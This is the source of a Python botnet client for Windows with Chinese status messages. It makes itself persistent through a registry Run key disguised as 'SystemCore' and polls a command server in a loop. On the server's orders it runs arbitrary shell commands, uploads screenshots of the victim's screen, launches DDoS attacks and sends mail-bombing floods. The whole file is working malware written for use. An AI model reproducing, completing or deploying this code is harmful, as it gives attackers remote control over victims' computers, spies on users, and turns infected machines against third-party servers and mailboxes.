import pyautogui
import requests
from socket import gethostname as getCName
import subprocess
import sys
import time

import win32api
import win32con

import DDOS
from _zmail import send_mail

exePath = sys.argv[0]
url = "http://localhost:5001/"
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                          "Software\Microsoft\Windows\CurrentVersion\Run",
                          0,
                          win32con.KEY_WRITE)
win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)


success = False
action = -1
while not success:
    try:
        response = requests.post(url + "init", data={"name": getCName()})
        response = response.json()
        action = response["action"]
        print("服务器通讯初始化成功！")
        success = True
    except:
        print("服务器通讯初始化失败！15秒后重新尝试...")
        time.sleep(15)


while True:
    try:
        while True:
            data = {"name": getCName(), "action": action}
            response = requests.post(url + "connect", data=data)
            response = response.json()
            print(response)
            action = response["action"]
            if response["actions"]:
                for i in response["actions"]:
                    # os.system(i)
                    subprocess.call(i, shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)

            if response.get("getScreen"):
                pyautogui.screenshot("Screenshot.png")
                requests.post(url + "upload", data={"name": getCName()},
                              files={"file": open("Screenshot.png",
                                                  "rb")})
                print("截图成功！")

            if response["DDOS"]["do"]:
                DDOS.run(times=response["DDOS"]["times"],
                         host=response["DDOS"]["host"],
                         page=response["DDOS"]["page"],
                         port=response["DDOS"]["port"])
                

            if response["mail-attack"]["do"]:
                if response["mail-attack"]["easy"]:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"])
                else:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"],
                                  from_name=response["mail-attack"]["from-name"],
                                  title=response["mail-attack"]["title"],
                                  content=response["mail-attack"]["content"])
                raise KeyboardInterrupt

            time.sleep(5)
    except KeyboardInterrupt:
        print("邮件发送成功！")
    except:
        print("未知错误！")
        time.sleep(10)
